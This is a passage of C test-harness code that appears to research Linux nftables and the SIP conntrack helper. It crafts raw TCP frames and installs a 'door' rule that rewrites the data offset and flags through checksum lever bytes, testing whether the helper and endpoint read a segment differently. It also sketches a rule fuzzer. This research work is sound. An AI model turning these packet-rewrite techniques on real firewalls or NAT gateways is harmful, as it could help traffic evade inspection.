		op_newchain(tab, "pre", NF_INET_PRE_ROUTING, -150, NF_ACCEPT);
		op_newrule_ctl_helper(tab, "pre", "sip");
	}
	op_newchain_nat(tab, "dstnat", NF_INET_PRE_ROUTING, -100);
	op_newrule_dnat(tab, "dstnat", F539_ADDR_ME, F542_PORT_DNAT);
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	errs = nf_flush();
	if (errs != 0) {
		close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=NETSETUP_ERR|errs=%d|errno=%d|extack=%.60s",
			 errs, g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}

	/* 3. handshake */
	if (f539_write_all(e.cmd, "E\n", 2) < 0) {
		snprintf(out, n, "setup=PEER_WRITE_FAIL");
		goto done;
	}
	if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0) {
		snprintf(out, n, "setup=PEER_NO_REPLY");
		goto done;
	}
	{
		char req[64];

		snprintf(req, sizeof(req), "K 0 %u\n", sport);
		if (f539_write_all(e.cmd, req, (int)strlen(req)) < 0) {
			snprintf(out, n, "setup=PEER_WRITE_FAIL");
			goto done;
		}
		if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0 ||
		    sscanf(line + 1, "%d %d %u %u", &i, &hsn, &srv_seq,
			   &hsflags) < 4) {
			snprintf(out, n, "setup=HS_REPLY_FAIL|%s", line);
			goto done;
		}
	}
	{
		struct pollfd pfd;

		pfd.fd = lfd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 1200) > 0) {
			cfd = accept(lfd, NULL, NULL);
			acc = (cfd >= 0);
		}
	}

	/* 4. the door goes in after the handshake: a SYN rewritten to doff 6
	 *    with flags PSH|ACK is not a SYN */
	if (a->store != F542_STORE_NONE) {
		nops = 0;
		nrecs = 0;
		op_newrule_door542(tab, "c", store);
		errs = nf_flush();
		if (errs != 0) {
			snprintf(out, n, "setup=DOOR_ERR|errs=%d|errno=%d|extack=%.60s",
				 errs, g_err ? -g_err : 0,
				 g_extack[0] ? g_extack : "none");
			goto done;
		}
	}

	/* 5. the data segment */
	f541_ct_invalid(&iv0);
	f542_ct_stat("invalid", &ivd0);
	f542_ct_stat("drop", &dr0);
	f541_tcp_snmp(&is0, &ie0, &cs0);
	if (a->payid != F542_PAY_NONE) {
		char req[96];
		int payid = a->payid;

		if (a->store != F542_STORE_NONE) {
			memcpy(pfx, w0, 4);		/* becomes the options or the pfx */
		} else if (payid == F542_PAY_REG_OPT) {
			pfx[0] = 0x02;			/* the same MSS bytes the door writes */
			pfx[1] = 0x04;
			pfx[2] = 0x05;
			pfx[3] = 0xb4;
		} else if (payid == F542_PAY_STER_OPT) {
			pfx[0] = 'R';			/* the door's store, as options */
			pfx[1] = 'E';
			pfx[2] = 'G';
			pfx[3] = 'I';
		}
		snprintf(req, sizeof(req), "N 0 %d %d %d %02x%02x%02x%02x\n",
			 a->segdoff, a->segflags, payid,
			 pfx[0], pfx[1], pfx[2], pfx[3]);
		if (f539_write_all(e.cmd, req, (int)strlen(req)) < 0) {
			snprintf(out, n, "setup=PEER_WRITE_FAIL");
			goto done;
		}
		if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0 ||
		    sscanf(line + 1, "%d %d %u %u %u:%u %u:%u %u:%u", &i, &nack,
			   &rack, &rflags, &a0, &af0, &a1, &af1, &a2, &af2) < 4) {
			snprintf(out, n, "setup=DATA_REPLY_FAIL|%s", line);
			goto done;
		}
		/* 6. the endpoint's own view: what the socket reads */
		if (cfd >= 0) {
			struct pollfd pfd;
			int waited = 0;

			pfd.fd = cfd;
			pfd.events = POLLIN;
			while (waited < 900 && rxlen < F542_DUMP) {
				ssize_t r;

				if (poll(&pfd, 1, 50) <= 0) {
					waited += 50;
					continue;
				}
				r = recv(cfd, rx + rxlen, sizeof(rx) - (size_t)rxlen,
					 MSG_DONTWAIT);
				if (r > 0)
					rxlen += (int)r;
				else
					break;
				waited += 50;
			}
		}
	}
	f541_ct_invalid(&iv1);
	f542_ct_stat("invalid", &ivd1);
	f542_ct_stat("drop", &dr1);
	f541_tcp_snmp(&is1, &ie1, &cs1);
	f542_ct_lines(sport, &ctlines, &cthelper);

	{
		/* where the translated address sits in the buffer the endpoint
		 * itself read.  If the helper had parsed from the pre-rewrite
		 * base, its write would land four bytes earlier and this offset
		 * would differ from the message's own field offset. */
		const char *needle = "10.9.0.1:5061";
		const char *hit = NULL;
		int k;

		for (k = 0; k + (int)strlen(needle) <= rxlen; k++) {
			if (!memcmp(rx + k, needle, strlen(needle))) {
				hit = (const char *)rx + k;
				break;
			}
		}
		urioff = hit ? (int)(hit - (const char *)rx) : -1;
	}
	off += snprintf(out + off, n - (size_t)off,
			"setup=OK|urioff=%d|hsn=%d|srvseq=%u|hsflags=%02x|acc=%d|nack=%d|rack=%u|rflags=%02x|acks=%u:%u,%u:%u,%u:%u|rxlen=%d|ctinv=%llu|ctinvd=%llu|ctdrop=%llu|ctlines=%d|cthelper=%d|inseg=%llu|inerr=%llu|cserr=%llu|w0=%02x%02x%02x%02x|pay=",
			urioff, hsn, srv_seq, hsflags, acc, nack, rack, rflags,
			a0, af0, a1, af1, a2, af2, rxlen, iv1 - iv0,
			ivd1 - ivd0, dr1 - dr0, ctlines, cthelper,
			is1 - is0, ie1 - ie0, cs1 - cs0, w0[0], w0[1], w0[2], w0[3]);
	for (i = 0; i < rxlen && (size_t)off + 2 < n; i++)
		off += snprintf(out + off, n - (size_t)off, "%02x", rx[i]);

done:
	nops = 0;
	nrecs = 0;
	op_deltable_f540(tab);
	nf_flush();
	if (cfd >= 0)
		close(cfd);
	if (lfd >= 0)
		close(lfd);
	f539_write_all(e.cmd, "C 0\n", 4);
	f539_read_line(e.ack, line, sizeof(line), 3000);
	f539_env_close(&e);
	return 0;
}

/* ---- the arms ---- */
static int sc_f19_ctl_hs(char *o, size_t n)
{
	struct f542_arm a = { "f19.ctl.hs",  0, F542_STORE_NONE, F542_PAY_NONE, 5, 0x10, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_ctl_reg(char *o, size_t n)
{
	struct f542_arm a = { "f19.ctl.reg",  0, F542_STORE_NONE, F542_PAY_REG, 5, 0x18, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_nohelper(char *o, size_t n)
{
	struct f542_arm a = { "f19.ctl.nohelper", 1, F542_STORE_NONE, F542_PAY_REG,
			      5, 0x18, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_byhand_valid(char *o, size_t n)
{
	struct f542_arm a = { "f19.byhand.valid",  0, F542_STORE_NONE, F542_PAY_REG_OPT,
			      6, 0x18, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_door_valid(char *o, size_t n)
{
	struct f542_arm a = { "f19.door.valid",  0, F542_STORE_MSS, F542_PAY_PFX_REG,
			      5, 0x18, 0x6018, 0x5018 };

	return f542_run(&a, o, n);
}

static int sc_f19_door_shift(char *o, size_t n)
{
	struct f542_arm a = { "f19.door.shift",  0, F542_STORE_REGI, F542_PAY_PFX_STER,
			      5, 0x18, 0x6018, 0x5018 };

	return f542_run(&a, o, n);
}

static int sc_f19_byhand_shift(char *o, size_t n)
{
	struct f542_arm a = { "f19.byhand.shift",  0, F542_STORE_NONE,
			      F542_PAY_STER_OPT, 6, 0x18, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_seq_ctl(char *o, size_t n)
{
	struct f542_arm a = { "f19.seq.ctl",  0, F542_STORE_NONE, F542_PAY_REG_OPT,
			      6, 0x18, 0, 0 };

	return f542_run(&a, o, n);
}

static int sc_f19_seq_door(char *o, size_t n)
{
	struct f542_arm a = { "f19.seq.door",  0, F542_STORE_MSS, F542_PAY_REG_OPT,
			      6, 0x18, 0x5018, 0x6018 };

	return f542_run(&a, o, n);
}

/* the model, checked against the three words F18 measured on a real wire:
 * store deee0000 / 0d0e0f10 / 4eee0000 on a 0x77*4 payload, old word 0x5002,
 * produced 0x6002 / 0x22d3 / 0xf002.  If this arm does not print three OKs,
 * the W0 the door arms send is a guess and the turn is void. */
static int sc_f19_model(char *o, size_t n)
{
	static const unsigned char w77[4] = { 0x77, 0x77, 0x77, 0x77 };
	static const unsigned char s1[4] = { 0xde, 0xee, 0x00, 0x00 };
	static const unsigned char s2[4] = { 0x0d, 0x0e, 0x0f, 0x10 };
	static const unsigned char s3[4] = { 0x4e, 0xee, 0x00, 0x00 };
	unsigned int v1 = f542_predict(0x5002, s1, w77);
	unsigned int v2 = f542_predict(0x5002, s2, w77);
	unsigned int v3 = f542_predict(0x5002, s3, w77);
	unsigned char w0[4] = { 0, 0, 0, 0 };
	unsigned char mss[4] = { 0x02, 0x04, 0x05, 0xb4 };
	unsigned char regi[4] = { 'R', 'E', 'G', 'I' };
	int r1 = f542_compute_w0(0x6002, 0x5002, s1, w0);
	int r2 = f542_compute_w0(0x6018, 0x5018, mss, w0);
	int r3 = f542_compute_w0(0x6018, 0x5018, regi, w0);
	int r4 = f542_compute_w0(0x5018, 0x6018, mss, w0);

	snprintf(o, n, "setup=OK|f18_6002=%s|f18_22d3=%s|f18_f002=%s|solve1=%d|solve_door_valid=%d|solve_door_shift=%d|solve_seq_door=%d",
		 v1 == 0x6002 ? "OK" : "MISMATCH",
		 v2 == 0x22d3 ? "OK" : "MISMATCH",
		 v3 == 0xf002 ? "OK" : "MISMATCH", r1, r2, r3, r4);
	return 0;
}

/* a diagnostic: the whole ct table, so "helper=sip" can be read off */
static int sc_f19_ctdump(char *o, size_t n)
{
	FILE *fp = fopen("/proc/net/nf_conntrack", "r");
	char buf[1024];
	int lines = 0, off = 0;

	if (!fp) {
		snprintf(o, n, "setup=NO_CT");
		return 0;
	}
	off += snprintf(o + off, n - (size_t)off, "setup=OK|");
	while (fgets(buf, sizeof(buf), fp) && lines < 40) {
		char *nl = strchr(buf, '\n');

		if (nl)
			*nl = 0;
		off += snprintf(o + off, n - (size_t)off, "%s ; ", buf);
		lines++;
	}
	fclose(fp);
	snprintf(o + off, n - (size_t)off, "|lines=%d", lines);
	return 0;
}

static void run_f19(void)
{
	static struct { const char *id; int (*fn)(char *, size_t); } tab[] = {
		{ "f19.ctl.hs", sc_f19_ctl_hs },
		{ "f19.ctl.reg", sc_f19_ctl_reg },
		{ "f19.ctl.nohelper", sc_f19_nohelper },
		{ "f19.byhand.valid", sc_f19_byhand_valid },
		{ "f19.door.valid", sc_f19_door_valid },
		{ "f19.door.shift", sc_f19_door_shift },
		{ "f19.byhand.shift", sc_f19_byhand_shift },
		{ "f19.seq.ctl", sc_f19_seq_ctl },
		{ "f19.seq.door", sc_f19_seq_door },
		{ "f19.ctdump", sc_f19_ctdump },
		{ "f19.model", sc_f19_model },
	};
	unsigned int i;

	for (i = 0; i < sizeof(tab) / sizeof(tab[0]); i++) {
		char out[4096];
		char id[128];
		int k;

		memset(out, 0, sizeof(out));
		snprintf(id, sizeof(id), "%s", tab[i].id);
		for (k = 0; id[k]; k++)
			if (id[k] == ' ')
				id[k] = '_';
		tab[i].fn(out, sizeof(out));
		printf("S %s|%s\n", id, out);
		fflush(stdout);
	}
}

/* ==========================================================================
 * differ543_add.c -- turn 543: F20 (the length-changing rewrite ON the door)
 *                    and F21 (an invariant fuzzer on the FIXED kernel 7.3.4).
 *
 * ---------------------------------------------------------------------------
 * F20.  F19 measured that the SIP helper and the endpoint read the same doff:
 * the helper runs at nf_confirm(), priority INT_MAX, after every nft chain.
 * F19 also wrote down what it had NOT measured: a rewrite that CHANGES the
 * length, so that nf_ct_seqadj carries a nonzero offset.  This battery adds
 * exactly that, and puts the door under it.
 *
 * Read from src/linux-7.3-R19 before writing a line of the battery:
 *
 *   nf_conntrack_sip.c:sip_help_tcp()   accumulates tdiff over every message it
 *                                        processed and calls
 *                                        hooks->seq_adjust(skb, protoff, tdiff)
 *                                        ONCE, at the end.
 *   nf_nat_sip.c:mangle_packet()         calls __nf_nat_mangle_tcp_packet(...,
 *                                        adjust=false): the per-header mangle
 *                                        never touches seqadj.
 *   nf_nat_helper.c                      sizediff = rep_len - match_len; a doff
 *                                        rewrite by nft changes NO length, so it
 *                                        can never appear in that number.
 *   nf_conntrack_seqadj.c                reply packets: newack = ack - ackoff,
 *                                        ackoff = offset[ORIGINAL] = tdiff.
 *
 * The Via is translated only if its address:port equals the conntrack ORIGINAL
 * tuple's src (nf_nat_sip.c, the `request` branch), and the replacement is
 * tuplehash[REPLY].tuple.dst -- i.e. the SNAT'd source.  Hence a nat chain at
 * LOCAL_IN (nft_nat_validate: SNAT hooks = POST_ROUTING | LOCAL_IN) with
 * `snat ip to 10.9.0.1:506`, and a Via that says the client's real
 * "10.7.0.9:5061".  "10.7.0.9:5061" -> "10.9.0.1:506": 13 -> 12 chars, -1.
 * Request-URI and Contact go 10.8.0.5:5060 -> 10.9.0.1:5061, 13 -> 13, delta 0,
 * so the segment's total tdiff is exactly -1 and nothing else.
 *
 * Arms: byhand.post (the post image, built by hand, no rule), ctl.seq (helper,
 * no door), ctl.seq2 (same + a second segment after the table is deleted),
 * door.up (5->6, the four prefix bytes are the checksum lever and the store
 * rewrites them into a legal MSS option, the message starts at 24 for both the
 * helper and the endpoint), door.down (6->5: the four option bytes are the
 * lever and the store rewrites them into "REGI", so the endpoint and the helper
 * both read "REGISTER ..." from offset 20), door.down.post (that same post image
 * built by hand).
 *
 * ---------------------------------------------------------------------------
 * F21.  The fuzzer.  One table, one FORWARD chain, one iteration = one
 * `payload ... set` rule with mutated base/offset/len/csum/register, then
 *   I1  every message the kernel returns is self-consistent (nlmsg_len ==
 *       NLMSG_HDRLEN + sum of aligned attribute lengths, recursively inside the
 *       dumps),
 *   I5  the dumped rule equals what was sent (base/offset/len/dreg; the kernel
 *       does not dump the csum attrs -- stated, not papered over),
 *   I2  the packet is forwarded exactly once,
 *   I6  the bytes that changed are exactly the store range (+ the 2-byte csum
 *       fixup outside it),
 *   I3  if the store was applied and does not cover the checksum field itself,
 *       the L4 checksum of the captured bytes verifies.
 * A violation is printed as its own line; the summary line counts everything.
 * ========================================================================== */

/* ---------------- F20 ---------------- */

#define NFT_MSG_GETRULE 7	/* enum nf_tables_msg_types */
#define NFT_MSG_DELRULE 8
#define F543_PORT_SNAT   506
#define F543_VIA_POST    "10.9.0.1:506"
#define F543_DUMP        400

#define F543_PAY_MSG     1	/* the message, Via = the client's real address */
#define F543_PAY_POST    2	/* the post image, Via = 10.9.0.1:506           */
#define F543_PAY_MSGPFX  3	/* checksum lever (4) + the message             */
#define F543_PAY_TAIL    4	/* the message minus its first four bytes       */
#define F543_PAY_WXYZ    5	/* "WXYZ": not a SIP message, so no mangle      */

static char f543_via[32];
static char f543_msg[1024];
static int  f543_msglen;
static char f543_post[1024];
static int  f543_postlen;

static int f543_format(char *dst, size_t cap, const char *v)
{
	return snprintf(dst, cap,
		"REGISTER sip:10.8.0.5:5060 SIP/2.0\r\n"
		"Via: SIP/2.0/TCP %s;branch=z9hG4bK543\r\n"
		"Max-Forwards: 70\r\n"
		"From: <sip:alice@example.com>;tag=f20\r\n"
		"To: <sip:bob@example.com>\r\n"
		"Call-ID: f20-543@example.com\r\n"
		"CSeq: 1 REGISTER\r\n"
		"Contact: <sip:alice@10.8.0.5:5060>\r\n"
		"Content-Length: 0\r\n"
		"\r\n", v);
}

static void f543_build(const char *postvia)
{
	f543_msglen = f543_format(f543_msg, sizeof(f543_msg), f543_via);
	f543_postlen = f543_format(f543_post, sizeof(f543_post), postvia);
}

static int f543_payload(int id, const unsigned char pfx[4], unsigned char *pay,
			int cap)
{
	int n = -1;

	switch (id) {
	case F543_PAY_MSG:
		memcpy(pay, f543_msg, (size_t)f543_msglen);
		n = f543_msglen;
		break;
	case F543_PAY_POST:
		memcpy(pay, f543_post, (size_t)f543_postlen);
		n = f543_postlen;
		break;
	case F543_PAY_MSGPFX:
		memcpy(pay, pfx, 4);
		memcpy(pay + 4, f543_msg, (size_t)f543_msglen);
		n = f543_msglen + 4;
		break;
	case F543_PAY_TAIL:
		memcpy(pay, f543_msg + 4, (size_t)(f543_msglen - 4));
		n = f543_msglen - 4;
		break;
	case F543_PAY_WXYZ:
		memcpy(pay, "WXYZ", 4);
		n = 4;
		break;
	}
	if (n < 0 || n > cap)
		return -1;
	return n;
}


/* like f542_wait_tcp, but it records every TCP frame in the window as
 * "sport:dport:flags:ack", so a frame that arrived with the wrong port is
 * visible instead of filtered away.  Returns the number recorded; *rack/*rfl
 * are the first ACK-flagged frame addressed to us. */
static int f543_wait_tcp(int fd, uint32_t mysport, uint32_t *rack,
			 uint32_t *rfl, char *rep, size_t rn, int ms)
{
	struct pollfd pfd;
	unsigned char buf[2048];
	int waited = 0, k = 0, idx = 0;

	*rack = 0;
	*rfl = 0;
	rep[0] = 0;
	pfd.fd = fd;
	pfd.events = POLLIN;
	while (waited < ms && idx < 6) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if (poll(&pfd, 1, 20) <= 0) {
			waited += 20;
			continue;
		}
		r = recvfrom(fd, buf, sizeof(buf), MSG_DONTWAIT,
			     (struct sockaddr *)&from, &fl);
		if (r < 40 || from.sll_pkttype == PACKET_OUTGOING)
			continue;
		if (buf[12] != 0x08 || buf[13] != 0x00 || buf[14 + 9] != IPPROTO_TCP)
			continue;
		{
			unsigned int sport = ((unsigned int)buf[34] << 8) | buf[35];
			unsigned int dport = ((unsigned int)buf[36] << 8) | buf[37];
			unsigned int flags = buf[47];
			unsigned int ack = ((unsigned int)buf[42] << 24) |
					   ((unsigned int)buf[43] << 16) |
					   ((unsigned int)buf[44] << 8) | buf[45];

			if (sport != F542_PORT_SIP && sport != F542_PORT_DNAT &&
			    dport != mysport)
				continue;
			if (idx == 0)
				snprintf(rep, rn, "D %u:%u:%02x:%u", sport, dport,
					 flags, ack);
			else
				snprintf(rep + strlen(rep), rn - strlen(rep),
					 ",%u:%u:%02x:%u", sport, dport, flags, ack);
			if (dport == mysport && (flags & 0x10) && !(flags & 0x02) &&
			    !*rack) {
				*rack = ack;
				*rfl = flags;
			}
			idx++;
			k = 1;
		}
	}
	if (!idx)
		snprintf(rep, rn, "D none");
	(void)k;
	return idx;
}

/* N2: like N, but the client's sequence number advances by what it sent --
 * that is what makes "the next segment" mean the next segment. */
static int f543_peer_data(int cid, int doff, int flags, int payid,
			  const unsigned char pfx[4], char *rep, size_t n)
{
	struct f542_conn *c;
	struct sockaddr_ll sll;
	unsigned char f[2048];
	unsigned char pay[1024];
	unsigned char opts[4];
	const unsigned char *optp = NULL;
	int idx = f539_ifindex("fv1");
	int plen, len, nack = 0, rc = 0;
	uint32_t rack = 0, rflags = 0;

	if (cid < 0 || cid >= 8 || !f542_c[cid].used || idx < 0)
		return -1;
	c = &f542_c[cid];
	plen = f543_payload(payid, pfx, pay, (int)sizeof(pay));
	if (plen < 0)
		return -1;
	if (doff > 5) {
		memcpy(opts, pfx, 4);
		optp = opts;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);
	len = f542_frame(f, F542_ADDR_CLIENT, F542_ADDR_SRV, c->sport,
			 F542_PORT_SIP, c->seq, c->ack, doff, flags, optp,
			 pay, plen);
	if (sendto(c->fd, f, (size_t)len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		rc = -2;
	c->seq += (uint32_t)plen;
	nack = f543_wait_tcp(c->fd, c->sport, &rack, &rflags, rep, n, 700);
	snprintf(rep + strlen(rep), n - strlen(rep), "\n");
	return rc;
}

/* DELRULE with table+chain and no handle: a chain flush */
static void op_delrule_flush543(const char *table, const char *chain)
{
	struct nlmsghdr *nlh;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELRULE,
			NLM_F_REQUEST | NLM_F_ACK, NFPROTO_IPV4);
	put_str(nlh, NFTA_RULE_TABLE, table, "z.f.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "z.f.chain");
	nops++;
}

/* rule: snat ip to <addr>:<port> -- the mirror of F19's op_newrule_dnat */
static struct nlmsghdr *op_newrule_snat(const char *table, const char *chain,
					uint32_t addr_host, uint16_t port_host)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "snat.exprs");
	unsigned char ab[4];
	unsigned char pb[2];
	struct nlattr *e, *d;
	uint32_t a = htonl(addr_host);

	memcpy(ab, &a, 4);
	pb[0] = (unsigned char)(port_host >> 8);
	pb[1] = (unsigned char)(port_host & 0xff);
	exfil_imm_value(nlh, NFT_REG32_00, ab, 4);
	exfil_imm_value(nlh, NFT_REG32_01, pb, 2);
	e = nest_start(nlh, NFTA_LIST_ELEM, "snat.elem");
	put_str(nlh, NFTA_EXPR_NAME, "nat", "snat.expr");
	d = nest_start(nlh, NFTA_EXPR_DATA, "snat.data");
	put_be32(nlh, NFTA_NAT_TYPE, NFT_NAT_SNAT, "snat.type");
	put_be32(nlh, NFTA_NAT_FAMILY, NFPROTO_IPV4, "snat.family");
	put_be32(nlh, NFTA_NAT_REG_ADDR_MIN, NFT_REG32_00, "snat.addr");
	put_be32(nlh, NFTA_NAT_REG_PROTO_MIN, NFT_REG32_01, "snat.port");
	nest_end(nlh, d);
	nest_end(nlh, e);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}


/* Tcp OutSegs (column 11) and OutRsts (column 14) from /proc/net/snmp, summed
 * over the value lines: this says whether the endpoint ACKed at all, which the
 * far side's silence alone cannot tell (turn 543's third smoke run). */
static int f543_tcp_out(unsigned long long *outsegs, unsigned long long *outrsts)
{
	FILE *fp = fopen("/proc/net/snmp", "r");
	char buf[2048];
	int hdr_seen = 0;

	*outsegs = 0;
	*outrsts = 0;
	if (!fp)
		return -1;
	while (fgets(buf, sizeof(buf), fp)) {
		if (strncmp(buf, "Tcp: ", 5) && strncmp(buf, "Tcp:\t", 5))
			continue;
		if (!hdr_seen) {
			hdr_seen = 1;
			continue;
		}
		{
			char *p2 = buf + 4;
			int idx = 0;
			unsigned long long v;

			while (*p2 && idx < 15) {
				while (*p2 == ' ' || *p2 == '\t')
					p2++;
				v = strtoull(p2, &p2, 10);
				if (idx == 10)
					*outsegs += v;
				if (idx == 13)
					*outrsts += v;
				idx++;
			}
		}
	}
	fclose(fp);
	return 0;
}


/* "sport:dport:flags:ack[,sport:dport:flags:ack...]" -> count, and the first
 * frame addressed to us that carries ACK and no SYN */
static void f543_frames(const char *s, int *n, unsigned int *ack,
			unsigned int *fl, uint32_t mysport)
{
	const char *p = s;

	*n = 0;
	*ack = 0;
	*fl = 0;
	while (p && *p) {
		unsigned int sp = 0, dp = 0, f = 0, a = 0;

		if (sscanf(p, "%u:%u:%x:%u", &sp, &dp, &f, &a) == 4) {
			(*n)++;
			if (!*ack && dp == mysport && (f & 0x10) && !(f & 0x02)) {
				*ack = a;
				*fl = f;
			}
		}
		p = strchr(p, ',');
		if (p)
			p++;
	}
}


static int f543_ct_line(uint32_t sport, char *dst, size_t n)
{
	FILE *fp = fopen("/proc/net/nf_conntrack", "r");
	char buf[1024], pat[32];
	int hit = -1;

	dst[0] = 0;
	if (!fp)
		return -1;
	snprintf(pat, sizeof(pat), "sport=%u ", sport);
	while (fgets(buf, sizeof(buf), fp)) {
		if (!strstr(buf, pat))
			continue;
		snprintf(dst, n, "%s", buf);
		{
			char *nl = strchr(dst, '\n');

			if (nl)
				*nl = 0;
		}
		hit = 0;
		break;
	}
	fclose(fp);
	return hit;
}

static int f543_dump(const char *table, const char *chain, int *nrules,
		     uint32_t *f_base, uint32_t *f_off, uint32_t *f_len,
		     uint32_t *f_dreg, int *nviol, int *nattr);

struct f543_arm {
	const char *id;
	int nohelper;
	int snat;
	int store;		/* 0 none, 1 MSS -> 0x6018, 2 REGI -> 0x5018 */
	int payid;
	int segdoff;
	int segflags;
	unsigned int targetV;
	unsigned int oldO;
	int snport;		/* the SNAT source port: 3 digits, so the Via
				 * replacement is exactly one byte shorter */
	int second;		/* 1 = a "WXYZ" segment after the table is gone */
};

static int f543_run(const struct f543_arm *a, char *out, size_t n)
{
	struct f539_env e;
	char tab[40];
	char line[512];
	unsigned char w0[4] = { 0, 0, 0, 0 };
	unsigned char store[4] = { 0, 0, 0, 0 };
	unsigned char rx[F543_DUMP];
	int lfd = -1, cfd = -1, errs, i, off = 0;
	int hsn = 0, acc = 0, nack = 0, nack2 = 0, rxlen = 0, rx2 = 0;
	char frames1[200], frames2[200];
	char ctline[512];
	int afterflush = -1, soerr = 0;
	int ctlines = 0, cthelper = 0, p1 = 0, p2 = 0;
	unsigned int srv_seq = 0, rflags = 0, rack = 0, rack2 = 0, hsflags = 0;
	unsigned int s0 = 0;
	unsigned long long iv0 = 0, iv1 = 0;
	unsigned long long is0 = 0, is1 = 0, ie0 = 0, ie1 = 0, cs0 = 0, cs1 = 0;
	unsigned long long ivd0 = 0, ivd1 = 0, dr0 = 0, dr1 = 0;
	unsigned long long os0 = 0, os1 = 0, or0 = 0, or1 = 0;
	struct f539_devstat dv0, dv1, dl0, dl1;
	int urioff = -1;
	static int f543_nport;
	uint32_t sport = 5061U + (uint32_t)(f543_nport++) * 1U;

	char postvia[32];

	memset(rx, 0, sizeof(rx));
	memset(line, 0, sizeof(line));
	memset(frames1, 0, sizeof(frames1));
	memset(ctline, 0, sizeof(ctline));
	memset(frames2, 0, sizeof(frames2));
	snprintf(f543_via, sizeof(f543_via), "10.7.0.9:%u", sport);
	snprintf(postvia, sizeof(postvia), "10.9.0.1:%d", a->snport);
	f543_build(postvia);
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	f539_route_add("fv0", F542_NET_CLIENT, 24, 0);
	f539_arp("fv0", F542_ADDR_CLIENT, f539_mac_far);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_tcp_loose", "1");

	if (a->store != F542_STORE_NONE) {
		if (a->store == F542_STORE_MSS) {
			store[0] = 0x02;
			store[1] = 0x04;
			store[2] = 0x05;
			store[3] = 0xb4;
		} else {
			store[0] = 'R';
			store[1] = 'E';
			store[2] = 'G';
			store[3] = 'I';
		}
		if (f542_compute_w0(a->targetV, a->oldO, store, w0) < 0) {
			f539_env_close(&e);
			snprintf(out, n, "setup=W0_FAIL");
			return 0;
		}
	}

	lfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (lfd >= 0) {
		struct sockaddr_in sa;
		int one = 1;

		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(F542_PORT_DNAT);
		sa.sin_addr.s_addr = htonl(F539_ADDR_ME);
		setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
		if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
		    listen(lfd, 8) < 0) {
			close(lfd);
			lfd = -1;
		}
	}
	if (lfd < 0) {
		f539_env_close(&e);
		snprintf(out, n, "setup=LISTEN_FAIL");
		return 0;
	}

	snprintf(tab, sizeof(tab), "t543_%d_%d", (int)getpid(), a->store);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	if (!a->nohelper) {
		op_newobj_cthelper(tab, "sip");
		op_newchain(tab, "pre", NF_INET_PRE_ROUTING, -150, NF_ACCEPT);
		op_newrule_ctl_helper(tab, "pre", "sip");
	}
	op_newchain_nat(tab, "dstnat", NF_INET_PRE_ROUTING, -100);
	op_newrule_dnat(tab, "dstnat", F539_ADDR_ME, F542_PORT_DNAT);
	if (a->snat) {
		op_newchain_nat(tab, "srcnat", NF_INET_LOCAL_IN, -100);
		op_newrule_snat(tab, "srcnat", F539_ADDR_ME,
				(uint16_t)a->snport);
	}
	op_newchain(tab, "c", NF_INET_LOCAL_IN, 0, NF_ACCEPT);
	errs = nf_flush();
	if (errs != 0) {
		close(lfd);
		f539_env_close(&e);
		snprintf(out, n, "setup=NETSETUP_ERR|errs=%d|errno=%d|extack=%.60s",
			 errs, g_err ? -g_err : 0, g_extack[0] ? g_extack : "none");
		return 0;
	}

	if (f539_write_all(e.cmd, "E\n", 2) < 0) {
		snprintf(out, n, "setup=PEER_WRITE_FAIL");
		goto done;
	}
	if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0) {
		snprintf(out, n, "setup=PEER_NO_REPLY");
		goto done;
	}
	{
		char req[64];

		snprintf(req, sizeof(req), "K 0 %u\n", sport);
		if (f539_write_all(e.cmd, req, (int)strlen(req)) < 0) {
			snprintf(out, n, "setup=PEER_WRITE_FAIL");
			goto done;
		}
		if (f539_read_line(e.ack, line, sizeof(line), 20000) < 0 ||
		    sscanf(line + 1, "%d %d %u %u", &i, &hsn, &srv_seq,
			   &hsflags) < 4) {
			snprintf(out, n, "setup=HS_REPLY_FAIL|%s", line);
			goto done;
		}
	}
	{
		struct pollfd pfd;

		pfd.fd = lfd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 1200) > 0) {
			cfd = accept(lfd, NULL, NULL);
			acc = (cfd >= 0);
		}
	}

	if (a->store != F542_STORE_NONE) {
		nops = 0;
		nrecs = 0;
		op_newrule_door542(tab, "c", store);
		errs = nf_flush();
		if (errs != 0) {
			snprintf(out, n, "setup=DOOR_ERR|errs=%d|errno=%d|extack=%.60s",
				 errs, g_err ? -g_err : 0,
				 g_extack[0] ? g_extack : "none");
			goto done;
		}
	}

	f541_ct_invalid(&iv0);
	f542_ct_stat("invalid", &ivd0);
	f542_ct_stat("drop", &dr0);
	f541_tcp_snmp(&is0, &ie0, &cs0);
